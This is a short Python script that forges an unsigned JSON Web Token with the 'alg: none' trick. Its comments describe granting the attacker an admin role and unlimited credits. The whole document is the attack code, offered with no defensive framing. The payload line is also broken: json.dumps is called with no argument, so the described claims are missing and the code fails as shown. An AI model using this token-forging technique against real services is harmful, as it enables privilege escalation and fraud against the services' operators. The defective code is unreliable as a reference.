import base64, json

# Step 1: Craft the header — tell the server "no signature needed"
header = json.dumps({"alg": "none", "typ": "JWT"}).encode()
header_b64 = base64.urlsafe_b64encode(header).decode().rstrip('=')

# Step 2: Craft the payload — give ourselves admin role and infinite credits
payload = json.dumps(
    ).encode()
payload_b64 = base64.urlsafe_b64encode(payload).decode().rstrip('=')

# Step 3: Combine — no signature, just a trailing dot
token = f"{header_b64}.{payload_b64}."
print(token)

